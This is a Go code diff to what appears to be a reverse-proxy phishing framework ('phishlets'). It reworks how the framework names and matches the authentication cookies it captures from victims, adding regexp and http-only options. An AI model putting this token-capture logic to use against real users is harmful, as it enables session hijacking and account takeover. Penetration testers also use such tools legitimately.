@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"net/url"
 	"regexp"
+	"strings"
 
 	"github.com/spf13/viper"
 )
@@ -25,6 +26,13 @@ type SubFilter struct {
 	redirect_only bool
 }
 
+type AuthToken struct {
+	domain    string
+	name      string
+	re        *regexp.Regexp
+	http_only bool
+}
+
 type Phishlet struct {
 	Site         string
 	Name         string
@@ -33,8 +41,7 @@ type Phishlet struct {
 	proxyHosts   []ProxyHost
 	domains      []string
 	subfilters   map[string][]SubFilter
-	authTokens   map[string][]string
-	httpTokens   map[string][]string
+	authTokens   map[string][]*AuthToken
 	k_username   string
 	re_username  string
 	k_password   string
@@ -62,9 +69,8 @@ type ConfigSubFilter struct {
 }
 
 type ConfigAuthToken struct {
-	Domain   string   `mapstructure:"domain"`
-	Keys     []string `mapstructure:"keys"`
-	HttpOnly []string `mapstructure:"http_only"`
+	Domain string   `mapstructure:"domain"`
+	Keys   []string `mapstructure:"keys"`
 }
 
 type ConfigUserRegex struct {
@@ -107,8 +113,7 @@ func (p *Phishlet) Clear() {
 	p.proxyHosts = []ProxyHost{}
 	p.domains = []string{}
 	p.subfilters = make(map[string][]SubFilter)
-	p.authTokens = make(map[string][]string)
-	p.httpTokens = make(map[string][]string)
+	p.authTokens = make(map[string][]*AuthToken)
 	p.k_username = ""
 	p.re_username = ""
 	p.k_password = ""
@@ -146,7 +151,10 @@ func (p *Phishlet) LoadFromFile(path string) error {
 		p.addSubFilter(sf.Hostname, sf.Sub, sf.Domain, sf.Mimes, sf.Search, sf.Replace, sf.RedirectOnly)
 	}
 	for _, at := range fp.AuthTokens {
-		p.addAuthTokens(at.Domain, at.Keys, at.HttpOnly)
+		err := p.addAuthTokens(at.Domain, at.Keys)
+		if err != nil {
+			return err
+		}
 	}
 	p.re_username = fp.UserRegex.Re
 	p.k_username = fp.UserRegex.Key
@@ -214,7 +222,7 @@ func (p *Phishlet) GenerateTokenSet(tokens map[string]string) map[string]map[str
 	for domain, tokens := range p.authTokens {
 		ret[domain] = make(map[string]string)
 		for _, t := range tokens {
-			td[t] = domain
+			td[t.name] = domain
 		}
 	}
 
@@ -238,17 +246,33 @@ func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string
 	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, mime: mime, regexp: regexp, replace: replace, redirect_only: redirect_only})
 }
 
-func (p *Phishlet) addAuthTokens(hostname string, tokens []string, http_tokens []string) {
-	p.authTokens[hostname] = tokens
-	p.httpTokens[hostname] = http_tokens
-}
-
-func (p *Phishlet) getAuthTokens() []string {
-	var ret []string
-	for _, v := range p.authTokens {
-		ret = append(ret, v...)
+func (p *Phishlet) addAuthTokens(hostname string, tokens []string) error {
+	p.authTokens[hostname] = []*AuthToken{}
+	for _, tk := range tokens {
+		st := strings.Split(tk, ",")
+		if len(st) > 0 {
+			name := st[0]
+			at := &AuthToken{
+				name:      name,
+				re:        nil,
+				http_only: false,
+			}
+			for i := 1; i < len(st); i++ {
+				switch st[i] {
+				case "regexp":
+					var err error
+					at.re, err = regexp.Compile(name)
+					if err != nil {
+						return err
+					}
+				case "httponly":
+					at.http_only = true
+				}
+			}
+			p.authTokens[hostname] = append(p.authTokens[hostname], at)
+		}
 	}
-	return ret
+	return nil
 }
 
 func (p *Phishlet) setUsernameRegexp(key string, v_regex string) error {
@@ -278,15 +302,31 @@ func (p *Phishlet) domainExists(domain string) bool {
 	return false
 }
 
-func (p *Phishlet) isTokenHttpOnly(domain string, token string) bool {
-	for d, tokens := range p.httpTokens {
-		if domain == d {
-			for _, tk := range tokens {
-				if tk == token {
-					return true
+func (p *Phishlet) getAuthToken(domain string, token string) *AuthToken {
+	if tokens, ok := p.authTokens[domain]; ok {
+		for _, at := range tokens {
+			if at.re != nil {
+				if at.re.MatchString(token) {
+					return at
 				}
+			} else if at.name == token {
+				return at
 			}
 		}
+	}
+	return nil
+}
+
+func (p *Phishlet) isAuthToken(domain string, token string) bool {
+	if at := p.getAuthToken(domain, token); at != nil {
+		return true
+	}
+	return false
+}
+
+func (p *Phishlet) isTokenHttpOnly(domain string, token string) bool {
+	if at := p.getAuthToken(domain, token); at != nil {
+		return at.http_only
 	}
 	return false
 }
